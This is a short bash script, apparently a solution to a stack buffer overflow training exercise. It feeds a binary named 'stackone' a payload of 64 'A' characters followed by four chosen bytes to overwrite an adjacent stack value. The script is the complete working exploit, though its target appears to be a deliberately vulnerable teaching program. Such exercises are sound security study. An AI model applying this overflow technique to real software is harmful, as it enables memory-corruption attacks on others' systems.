# Author: Matthew McKeever
# Date 08/08/2021

#!/bin/bash

# Executes the stackone binary and utilizes command substitution to use the payload as an argument
./stackone $(python -c "print('A'*0x40 + '\x62\x59\x6c\x49')")
